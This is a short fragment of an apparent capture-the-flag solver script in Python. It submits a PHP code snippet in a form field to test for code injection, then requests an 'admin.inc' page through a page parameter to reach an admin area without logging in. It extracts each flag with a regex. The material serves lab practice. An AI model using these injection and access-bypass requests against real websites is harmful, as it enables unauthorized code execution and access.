...
try:
    ...
    if get_request(ctf_url).status_code == 200:
        ...
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", post_request(ctf_url, data = {'body': '<?php echo "Hello Skillshetra" ?>'}).text).group(1)}$FLAG$')
        # Getting Flag 2 by opening admin page which doent require login #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f'{ctf_url}?page=admin.inc').text).group(1)}$FLAG$')
